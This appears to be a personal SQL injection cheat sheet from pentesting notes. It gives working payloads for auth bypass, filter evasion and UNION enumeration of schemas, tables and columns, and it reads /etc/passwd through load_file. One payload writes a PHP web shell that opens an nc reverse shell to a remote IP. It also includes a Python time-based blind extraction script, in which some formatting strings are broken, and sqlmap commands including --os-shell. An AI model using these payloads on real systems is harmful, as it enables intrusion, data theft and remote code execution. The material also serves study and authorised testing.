# Basic access
Maybe the database have the default login, we can try with:
```console
$ mysql -u root -h <ip>
```

---

# Basic Injection
If we can send a query to the database to log, we can do:
```sql
' or '1'='1' --
```

Probably we need to change the text to bypass filter:
```sql
aNd 1=1
aNd 21=21
orDeR bY 1
orDer+bY+1
orDer/\*\*/bY/\*\*/1
orDer%20bY%201
```
We can change the spaces by:
```sql
+, /**/, %20
```

Then we add a comment line, there are different comment for each program:
- Oracle: --
- MySQL: #
- MariaDB: /* */
Some others comment can be:
- /*
- //
- %23

> Probably, we need to add **;** at the end of the query (before the comment).
{: .prompt-tip }

Also, we can try to catch the login request with burp and send the SQLi with it.

# Error Based
When we see an SQL error in the page we can try to gather information of the web.
Adding and:
```sql
... ORDER BY 5; --
```
We can check how many rows are in the query.
> (We can change **--** to others SQL comments.)
{: .prompt-tip }

Then we can do an union with the columns:
```sql
... UNION SELECT 1,2,3,4,5;
... UNION SELECT NULL,NULL,NULL,NULL,NULL;
```

We can use to enumerate the following functions, replacing the numbers or NULL:
- database()
- user()
- load_file('/etc/password')

Now we can get the tables from the database:
```sql
... UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema = "database-name";
```

Or the others databases:
```sql
... UNION SELECT schema_name,NULL FROM information_schema.schemata;
```
Some databases can limit the amount on databases show, we can try to change it with limit:
```sql
... UNION SELECT schema_name,NULL FROM information_schema.schemata LIMIT 1,1; -- This will show the first one
... UNION SELECT schema_name,NULL FROM information_schema.schemata LIMIT 2,1; -- This will show the second one
```

To get the columns of a table:
```sql
... UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = "database-name" AND table_name = "table-name";
```

We can use this syntax to read and write system files:
```sql
... UNION SELECT load_file('/etc/passwd'), NULL;
... UNION SELECT 'SUS', NULL into outfile '/tmp/attack.txt;
```
And then create a reverse shell:
```sql
' union select null,'<?passthru("nc -e /bin/sh 192.168.1.134 9000");?>' into outfile '/tmp/shell.php'#
```

If we can not pass a string like **"database-name"** we can encode it:
```console
$ echo "database-name" | xxd -ps
```
##### (We may remove the **0a**, and add a **0x** at the beggining.)

---

# Time Based (Blind)
We can make sleep the sql function in order to guess if the page is not displaying anything.

For example:
```sql
... 'admin' and sleep(5) --If the user is correct it will wait 5 sec 
... AND if(substr(database(),1,1)='c', sleep(5),1); --
```

We can make a Python Script:
```python
#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

url = '[your-url]'
s = '0123456789abcdefghijklmnopqrstuvwxyz'
result = ''

def def_handler(sig, frame):
	log.failure("Saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def check(payload):
	data_post = {
		'username' : '%s' % payload,
		'password' : 'test'
	}

	time_start = time.time()
	content = requests.post(url, data=data_post)
	time_end = time.time()

	if (time_end - time_start > 5):
		return 1

p1 = log.progress('Database')
p2 = log.progress('Payload')

for i in range(0,10):
	for c in s:
		payload = "' OR if(substr(database(),%d,1)='%c', sleep(5),1); -- - % (i, c)"
		p2.status("%s" % payload)
		
		if check(payload):
			result += c
			p1.status("%s % result")
			break

log.info("Database: %s" % result)
```

We can change **database()** from the others functions in the **Error Based** to guess another values (tables, columns,...).

# SQLmap
We can try searching a URL with:
```console
> sqlmap -u "http://192.168.1.137/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details"
```

We can use the following options to get a reverse shell:
- **--os-shell**
- **--sql-shell**

With **Burp** we can capture the request and do the scan with a file with the header:
```console
> sqlmap -r req.txt
```
